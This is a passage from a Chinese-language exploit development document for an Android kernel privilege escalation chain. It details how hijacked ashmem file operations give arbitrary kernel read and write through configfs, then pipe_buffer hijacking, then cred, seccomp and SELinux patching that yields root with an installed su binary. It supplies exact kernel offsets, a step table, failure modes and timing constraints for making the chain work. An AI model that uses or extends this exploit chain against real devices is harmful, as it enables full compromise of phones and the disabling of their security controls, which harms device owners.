| `ioctl/mmap/open/release/show_fdinfo` | 保留真实 ashmem 实现 |
| `splice_read` @0xb8 | `text_addr(COPY_SPLICE_READ)` |

### 4.2 机制：`ashmem_area` 的 name 缓冲 = `configfs_buffer`

`ashmem_misc.fops = fake_fops` 之后，`open("/dev/ashmem")` 得到的 fd 的
`file->f_op` 就是 `fake_fops`，于是 `read()`/`write()` 变成 `configfs_read_file` /
`configfs_write_file`，而 `file->private_data` 仍是 **`ashmem_area`**。

`ashmem_set_name` 的 ioctl 把用户 256 字节**原样写进 `ashmem_area->name`（结构体偏移 0）**。
PoC 以 `ASHMEM_NAME_PREFIX_LEN = 11` 校正，因此
`blob[i]` 落在 `ashmem_area + (i + 11)` ⇒ **`ashmem_area` 的前 128 字节可被任意伪造**，
正好覆盖 `struct configfs_buffer`（本镜像布局，`offset.h:183-188`）：

| `configfs_buffer` 字段 | 偏移 | 用途 |
|---|---|---|
| `count` | 0 | 读长度 |
| `pos` | 8 | 读偏移（置 0） |
| **`page`** | 16 | 读源地址 |
| `needs_read_fill` | 96 | **置 0 ⇒ 跳过 `d_fsdata` 解引用**（`fops.c:1108-1112` 的坑） |
| **`bin_buffer`** | 104 | 写目标地址 |
| `bin_buffer_size` | 112 | 写长度 |
| `cb_max_size` | 116 | 置 0 ⇒ 跳过上限校验 |

⇒ `configfs_read_once(fd, target, buf, len)` = **任意内核读**；
`configfs_write_once(fd, target, data, len)` = **任意内核写**（`util.c:3395-3450`）。

> 别名：`kernel_read64()` / `kernel_read_data()` / `kernel_write_data()` 就是它们的包装
> （`util.c:3460-3475`）。

---

## §5 环 3：pipe_buffer 劫持 → direct-map 任意读写（代码已就绪）

`install_pipe_physrw(fd)`（`pipe.c:618-693`）：

1. 用环 2 的读写求出 reclaim 页里某个 `struct pipe_buffer` 的位置
   （`find_pipe_buffer()`，`pipe.c:420-490`：扫 `pb.page ∈ [VMEMMAP_START, VMEMMAP_END)`、
   `pb.ops == ANON_PIPE_BUF_OPS`、`pb.flags == PIPE_BUF_FLAG_CAN_MERGE`）；
2. **读**：改 `pb.page = direct_to_page(addr)`、`pb.offset = addr & 0xfff`、`pb.len = len+1`
   ⇒ `read(pipefd[0], out, len)` 从 `addr` 拷出（`pipe_phys_read()`）；
3. **写**：改 `pb.len = 0`、`pb.flags = PIPE_BUF_FLAG_CAN_MERGE`
   ⇒ `write(pipefd[1], data, len)` 原地合并进 `addr`（`pipe_phys_write()`）；
4. 用 `kernel_read64/kernel_write_data` 把 `pb` 恢复原状。

⇒ `pipe_read64()` / `pipe_read32()` / `pipe_write64()`（`pipe.c:602-616`），
地址必须是 **direct-map**（`is_direct_ptr()`）。

**为什么需要环 3 而不直接用环 2**：`fops.c:1108-1112` 的注释说明 configfs 读回调在
ashmem 文件上会解引用 `dentry->d_fsdata`（不安全），且每次读都要重设 name；
pipe 通道更适合做大量、多次、稳定的读写。

---

## §6 环 4：cred / seccomp / SELinux → root（代码已就绪）

`install_android_root(fd)`（`root.c:307-466`）：

| 步骤 | 代码 | 动作 |
|---|---|---|
| 1 | `root.c:325-335` | `init_tasks_prev = *(INIT_TASK_TASKS + 8)` ⇒ `current_task_addr = init_tasks_prev - TASK_TASKS_OFF` |
| 2 | `root.c:138-177` | `find_task_by_tgid()`：沿 `task->tasks` 链遍历，匹配 `pid/tgid` |
| 3 | `root.c:354-360` | 读 `task->real_cred` / `task->cred` / `cred->security` |
| 4 | `root.c:179-217` | `patch_cred_identity()`：`uid/gid/euid/egid = 0`、`securebits = 0`、5×`CAP_FULL`（并回读校验） |
| 5 | `root.c:219-233` | `patch_cred_sid()`：`cred->security + blob_off + 4` 写 `SELINUX_KERNEL_SID` |
| 6 | `root.c:239-305` | `patch_task_seccomp()`：清 `TIF_SECCOMP`、`PFA_NO_NEW_PRIVS`、`seccomp.mode/count/filter` |
| 7 | `root.c:430-436` | 直接写 `*(uint8_t *)data_addr(SELINUX_ENFORCING) = 0` |
| 8 | `root.c:42-109` | fork 子进程 → `setgid(0)` / `setuid(0)` → 写 `/sys/fs/selinux/enforce` → `install_embedded_su()` |
| 9 | `root.c:111-136` | 收报告，校验 `uid/euid/gid/egid == 0` |

⇒ **root 闭环完成**（`su` 落在 `/data/local/tmp/su`，连 `/data/local/tmp/temp_su.sock`）。

---

## §7 对接表：环 1 ↔ 环 4 需要的全部偏移

| 名称 | 值 | 来源 |
|---|---|---|
| `KIMAGE_TEXT_BASE` | `0xffffff8008080000` | `offset.h:13` |
| `P0_PAGE_OFFSET` | `0xffffffc000000000` | `offset.h:14` |
| `ASHMEM_MISC_FOPS_OFF` | `0x330d198` | `offset.h:48`（实测 = `ashmem_misc+0x10`） |
| `data_addr(ASHMEM_MISC_FOPS)` | `0xffffffc00338d198` | `util.c:2289` live-vetted |
| `TASK_TASKS_OFF` / `TASK_PID_OFF` / `TASK_TGID_OFF` | `0x540` / `0x640` / `0x644` | `offset.h:195-203` |
| `TASK_REAL_CRED_OFF` / `TASK_CRED_OFF` | `0x7f0` / `0x7f8` | `offset.h:200-201` |
| `TASK_COMM_OFF` / `TASK_SECCOMP_OFF` | `0x800` / `0x8a0` | `offset.h:202,209` |
| `CRED_UID_OFF` / `CRED_SECUREBITS_OFF` / `CRED_CAPS_OFF` / `CRED_SECURITY_OFF` | `4` / `36` / `40` / `120` | `offset.h:211-214` |
| `SELINUX_ENFORCING_OFF` | `0x292d200` | `offset.h:72` |
| `ANON_PIPE_BUF_OPS_OFF` | `0x1da1e40` | `offset.h:75` |
| `INIT_TASK_OFF` | `0x31ad980` | `offset.h:67` |
| `waiter`: `tree_entry`/`pi_tree_entry`/`task`/`lock`/`prio`/`deadline` | `0x00/0x18/0x30/0x38/0x40/0x48` | `offset.h:143-148` |
| `rt_mutex`: `wait_lock`/`waiters.rb_root`/`waiters.rb_leftmost`/`owner` | `0x00/0x10/0x18/0x20` | `offset.h:135-140` |

---

## §8 前置条件、失败模式与观测手段

### 8.1 环 1 的**必要**前置（缺一不可）

1. `kaslr_done`（否则所有 `text_addr/data_addr` 都是错的）；
2. `page_base` 有效且**页内容已按 §3.9 填好**；
3. W 在 `f_pi_chain` 上已把自身 `prio` clamp 到 120（`main.c:1530-1562` 的 boost-gate，
   实测 `/proc/<W>/stat` field 18 → 20）；
4. `FUTEX_CMP_REQUEUE_PI` 返回 `EDEADLK`（35）；
5. W 进入 `sendmsg` 且 `msg_namelen = 0x28`、`msg_iovlen = 1`；
6. consumer 在涂写**之后**才 `sched_setattr(W)`（`run_paint_oracle()` 的 `settle_ms`）。

### 8.2 失败模式

| 现象 | 含义 |
|---|---|
| `paint ABORT: W never entered sendmsg` | 环 1 第 5 步没成立（W 未进入 sendmsg） |
| 存活且 `verdict=no_paint` | 门关（`prio` 仍是 120）⇒ 涂写未落地 |
| 存活且 `painted` | 涂写落地但链走提前退出（`fake_lock->owner == W`？） |
| 崩（`PANIC_ON_OOPS`） | 链走走到底 ⇒ 按 §3.6 应当是**写落地后**的正常返回；若崩说明某一处地雷未满足 |

### 8.3 已知风险项（需一次回读验证，不影响理论）

1. **`fake_fops->owner` 被改写**（§3.7）：环 1 会把 `owner` 写成
   `ASHMEM_MISC_FOPS - 0x08`。`open("/dev/ashmem")` 的 `misc_open()` 会
   `fops_get()` → `try_module_get(owner)`，需要
   `module->state != MODULE_STATE_GOING` 且 `module->refcnt != 0`
   （`refcnt` @ `owner + 0x318` = `ASHMEM_MISC_FOPS + 0x310`，`util.c:2570-2578` 提到）。
   **建议**：环 1 之后立刻用 `configfs_read_once(fd, ASHMEM_MISC_FOPS+0x310, …)` 回读确认非 0。
2. **`.rodata`/`.data` 在本 ELF 里被置零**，所以 `*(ASHMEM_MISC_FOPS + 0x310)` 无法静态确认，
   只能上机回读。
3. `ASHMEM_MISC_FOPS - 0x10`（= `ashmem_misc.minor`）在环 1 后不变（`rb_erase` 路径只写
   `ASHMEM_MISC_FOPS` 与其 +0x08 判定项），因此**可以重复触发**（不像 `rb_insert` 路径是一次性的）。

### 8.4 观测手段（崩溃取证已死）

- `/proc/kmsg`、`/proc/last_kmsg`、`/sys/fs/pstore`、`dmesg` 对 `u:r:shell:s0` **全部 EACCES**。
- 可用：`/proc/<tid>/stat` field 18、`paint_ok`、`verdict=`、以及**用户态可见副作用**
  （把危险解引用导向用户可读页的内核线性映射别名，读内核 CAS 的 `0→1`）。

---

## §9 结论与下一步（理论 → 实证）

**理论层面：链路闭合。** 环 1 的候选路径里，`rb_erase` 的 **Case 1 变体**
（`IONSTACK_FOPS_PI_RB_SHAPE=target-left`）是唯一同时满足「全部前置」与
「`fake_fops->owner` 保持 0」的构型，且 §3.6 逐行核对无地雷。

**实证层面剩下三件事**（都不需要新 dump）：

1. 把 `IONSTACK_INSERT_TARGET_OFF` 关掉（= 0），改跑
   `IONSTACK_FOPS_PI_RB_SHAPE=target-left` + `IONSTACK_FOPS_LOCK_OWNER_MODE=fake-task`
   （**写目标自动 = `data_addr(ASHMEM_MISC_FOPS)`**，无需环境变量）；
2. 换判据：环 1 之后立刻 `open("/dev/ashmem")` + `configfs_read_once(fd, misc_fops, …)`
   看是否等于 `fake_fops`（这是**用户态可见**的，不依赖崩溃）；
3. 回读 `ASHMEM_MISC_FOPS + 0x310`，确认 §8.3(1) 的 `try_module_get` 前提。

> **不要再用 `ghostlock-right`。** 它把 `fake_fops->owner` 涂成
> `ASHMEM_MISC_FOPS - 0x08`，而 `fops_get()` 一旦看到 `owner != 0` 就会调
> `try_module_get()`，其 `module->refcnt @ +0x318` 正好落在
> `abc_hub_driver.driver.acpi_match_table`（静态零初始化）⇒ 必败 ⇒
> `open("/dev/ashmem")` = `-ENODEV`，环 2 起不来。详见 §3.8。

**时序硬约束（本轮新增）**：W 从 `FUTEX_WAIT_REQUEUE_PI` 返回到进入阻塞 `sendmsg`
之间**不得有任何 syscall**，尤其不得有 `pr_*()`。`write()` 的 `pipe_write()` 帧
（`sp = SP0-0x1e0`，帧 `0xb0`）会把整个 `waiter+0x00..0x58` 用 callee-saved 寄存器
覆盖一遍，而 `sendmsg` 的 `address` 拷贝只重涂 `waiter+0x28..0x50`
⇒ 残余 `RB_CLEAR_NODE`（rtmutex.c:664 的早退依据）会被毁掉。
W 侧的两条 `pr_*` 已改为「发布到全局 / atomic，由 R 打印」。

---

## 附录 A：与既有文档的关系

| 文档 | 关系 |
|---|---|
| `PAINT_ORACLE_ANALYSIS.md` | §4.3/§4.4 的判据读法（「崩溃 = 落地」）本文件沿用；§6 的 P0/P1 清单被本文件 §3.8/§3.9/§9 取代 |
| `RTMUTEX_WEAPONIZATION.md` §12.5 | 首次提出 `rb_insert` Case 3 与 `ghostlock-right`；本文件 §3.8 给出**为什么两个都不能选**的二进制证据（`minor = 0xff` 否掉 `rb_insert`；`abc_hub_driver` 布局 + `try_module_get` 反汇编否掉 `ghostlock-right`），结论落到 `target-left` |
| `RTMUTEX_WEAPONIZATION.md` §15.19 | 「判据读反」的更正；本文件 §3.5 给出「相等则早退」的源码定位 |
| `PSELECT_GEOMETRY_FINDINGS.md` §9 | pselect 结构上不可行；本文件与之一致（环 1 的 vehicle 用 `sendmsg`） |
